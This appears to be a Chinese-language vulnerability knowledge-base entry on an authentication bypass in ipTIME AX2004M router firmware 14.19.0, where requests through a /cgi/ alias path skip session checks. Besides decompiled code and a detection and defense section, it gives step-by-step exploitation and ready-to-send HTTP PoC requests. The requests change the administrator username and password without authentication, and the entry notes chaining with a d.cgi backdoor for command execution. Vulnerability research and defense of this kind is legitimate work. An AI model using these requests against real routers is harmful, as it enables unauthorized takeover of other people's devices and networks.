---
id: iot-iptime-ax2004m-cgi-alias-path-auth-bypass
title: ipTIME AX2004M /cgi 别名路径绕过 /sess-bin 会话校验（未授权修改管理员密码）
type: scenario
domain: iot
path: iot
technique: router-cgi-request-uri-prefix-session-check-alias-path-bypass
aliases:
- ipTIME AX2004M
- AX2004M 14.19.0
- httpcon_check_session_url
- httpcon_auth
- /sess-bin/
- /cgi/timerpro.cgi
- hiddenloginsetup
- efm_session_id
- 未授权修改密码
tags:
- iot
- router
- firmware
- iptime
- auth-bypass
- cgi
- unauth
- password-reset
- mips
cve: []
severity: high
confidence: high
status: verified
affected_versions: AX2004M 14.19.0
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V131
  verified_at: '2026-11-06T05:44:57+08:00'
  notes: 已对照原文与全部49张图片核对：httpcon_check_session_url 仅对 REQUEST_URI 前缀 /sess-bin/ 返回1（图21/23）、/cgi/timerpro.cgi 无 Cookie 返回200管理页（图27）、无 Cookie POST act=save&tmenu=iframe&smenu=hiddenloginsetup 修改为 aaaaa/aaaaa 并登录成功（图28-30）、Boa httpd 以 root 运行（图6）均与原文一致；affected_versions AX2004M 14.19.0 已按原文设置。未复跑 PoC。
---

## 一句话结论

ipTIME AX2004M 14.19.0 的 CGI 会话校验只对 `REQUEST_URI` 以 `/sess-bin/` 开头的请求生效；同一批 CGI（如 `timerpro.cgi`）还可通过 `/cgi/` 别名访问，因此不带任何 Cookie 请求 `/cgi/timerpro.cgi` 即可绕过鉴权读取管理页面，并提交 `act=save&tmenu=iframe&smenu=hiddenloginsetup&...&new_login=aaaaa&new_passwd=aaaaa` 未授权修改管理员账号密码。

## 原理

- 设备 Web 服务为 Boa（进程列表可见 `httpd -s /var/run/boa_vh.80.conf`，以 root 运行），CGI 二进制位于 `/cgibin`。正常管理界面通过 `/sess-bin/*.cgi` 访问，同时存在 `/cgi/*.cgi` 别名路由指向同一批 CGI。
- 鉴权判断在 CGI 分发函数（原文称 `ftext`）开头：

```c
e_log_init("cgi.timepro", a2, a3);
if ( httpcon_check_session_url() && !httpcon_auth(1, 1) )
    return 0;
```

- `httpcon_check_session_url()` 位于 `lib/libsession.so`，逻辑是：

```c
bool httpcon_check_session_url()
{
    char *v0 = getenv("REQUEST_URI");
    return !v0 || strncmp(v0, "/sess-bin/", 0xA) == 0;
}
```

  即只有 URI 以 `/sess-bin/` 开头才返回 1，其余路径一律返回 0。

- `httpcon_auth(1, 1)`：先取认证方式，若不是 `session` 直接返回 1；否则从 `HTTP_COOKIE` 中解析 `efm_session_id`，调用 `check_session("httpcon", id, REMOTE_ADDR)` 校验，成功返回 1，失败调用 `redirect_login()` 并返回 0。
- 组合条件只在「路径属于 `/sess-bin/` 且没有有效会话」时成立并 `return 0` 终止请求。访问 `/cgi/timerpro.cgi` 时 `httpcon_check_session_url()` 返回 0，整个 `&&` 表达式为假，鉴权分支根本不会进入，请求被当作已认证继续执行到功能分发逻辑。
- **为什么成立**：认证决策绑定在 URL 前缀字符串上，而不是绑定到实际解析出的脚本/处理器；同一 CGI 存在未纳入校验的别名路由，且默认不是 deny-by-default。`/sess-bin/` 前缀一旦不匹配，后续功能代码（时间、系统设置、隐藏登录设置等）直接执行。
- 原文还提到鉴权之后有 `check_csrf_attack()` 检查，但实际未授权 POST 修改密码成功，说明该检查未形成有效阻断（原文未展开其实现）。

## 触发条件

- 目标为 ipTIME AX2004M，固件 14.19.0（原文标注：产品 AX2004M，版本 14.19.0），80 端口 Web 管理面可达。
- 请求路径不以 `/sess-bin/` 开头、但仍能路由到 `/cgibin` 下的 CGI，例如 `/cgi/timerpro.cgi`。
- 修改密码需要同时提交 `captcha_file` 与 `captcha_code`：原文先从 `/sess-bin/captcha.cgi` 获取验证码文件标识与验证码图片（截图中该请求带已有会话 Cookie；未登录状态下是否可直接经 `/cgi/captcha.cgi` 获取，原文未单独验证）。
- 请求体中的 `tmenu=iframe&smenu=hiddenloginsetup` 对应隐藏的登录设置保存动作。

## 利用步骤

1. 访问 `http://<router>/` 确认 ipTIME AX2004M 登录页。
2. 不携带 Cookie 请求 `/cgi/timerpro.cgi?tmenu=system&smenu=info`，若返回 200 且为管理配置页（而非跳转 `/sess-bin/login_session.cgi`），说明鉴权被绕过；作为对照，同一请求换成 `/sess-bin/timerpro.cgi` 会被重定向到登录页。
3. 请求 `/sess-bin/captcha.cgi`（或尝试同义 `/cgi/captcha.cgi`），从返回 HTML 中取出隐藏字段 `captcha_file` 的值，并读取 `/captcha/<token>.gif` 中的验证码。
4. 不携带 Cookie 向 `/cgi/timerpro.cgi` 提交保存请求，写入新的管理员用户名和密码。
5. 用新账号登录管理界面，完成管理员账户接管；随后可继续开启远程支持等功能，或结合 `d.cgi` 后门执行命令。

## PoC

```http
GET /cgi/timerpro.cgi?tmenu=system&smenu=info HTTP/1.1
Host: 192.168.0.1
Connection: close
```

```http
POST /cgi/timerpro.cgi HTTP/1.1
Host: 192.168.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 142
Connection: close

act=save&tmenu=iframe&smenu=hiddenloginsetup&captcha_file=<captcha_file>&captcha_code=<captcha_code>&new_passwd=aaaaa&new_login=aaaaa
```

```text
# 原文实测结果：POST 无 Cookie 返回 200，随后用 aaaaa/aaaaa 成功登录管理界面
```

## 变体与关联

- 同一 `ftext` 鉴权逻辑被 `/cgibin` 下多个 CGI 引用（原文 grep 命中 `m.cgi`、`download*.cgi`、`mesh.cgi`、`upgrade.cgi`、`timepro.cgi`、`lib/libsession.so` 等），`/cgi/` 别名绕过预计同样适用于这些处理器，可扩大未授权操作面（如系统设置、网络设置、固件升级、文件下载）。
- 未授权开启远程支持：`POST /cgi/timerpro.cgi`，参数 `tmenu=iframe&smenu=sysconf_misc&service=remotesupport&run=&...&remotesupporth=1&...`（原文在登录态抓包；结合本绕过可无会话提交）。
- 与本文章另一场景串联：绕过鉴权后访问隐藏调试后门 `/cgi/d.cgi` 可获得命令执行，见 [[iot-iptime-ax2004m-dcgi-debug-backdoor-command-injection]]。
- 同类固件 Web 命令注入可参考 [[iot-firmware-boa-pin-command-injection]]。

## 检测与防御

- 检测：Web 日志中出现不带 `efm_session_id` 的 `/cgi/*.cgi` 请求；同一 IP 先 GET `/cgi/timerpro.cgi` 再 POST `smenu=hiddenloginsetup`；登录设置被非管理会话修改；`/cgi/` 路径返回 200 管理页。
- 防御：鉴权必须基于解析后的脚本/处理器或统一入口，默认拒绝；对 URI 做规范化后再匹配，覆盖所有别名路由（`/sess-bin/`、`/cgi/`、大小写/编码变体）；移除未使用的别名；修改密码等敏感操作强制校验当前密码并绑定会话；升级到厂商修复固件。
- 加固：Web 服务以低权限运行，限制管理面仅内网/管理 VLAN 可达。
